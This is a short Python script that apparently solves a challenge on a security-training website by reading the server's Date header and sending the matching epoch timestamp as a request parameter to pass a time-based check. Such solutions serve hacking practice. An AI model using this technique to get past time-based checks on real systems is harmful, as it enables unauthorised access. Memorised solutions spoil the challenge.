import requests
from email.utils import parsedate_to_datetime

URL = "http://training.securitum.com/rozwal/podstawowka/podstawowka_5.php"

r = requests.get(URL)
server_date = parsedate_to_datetime(r.headers['Date'])
server_epochtime = int(server_date.timestamp())
payload = {'a': server_epochtime}
r = requests.get(URL, params=payload)
print(r.text)

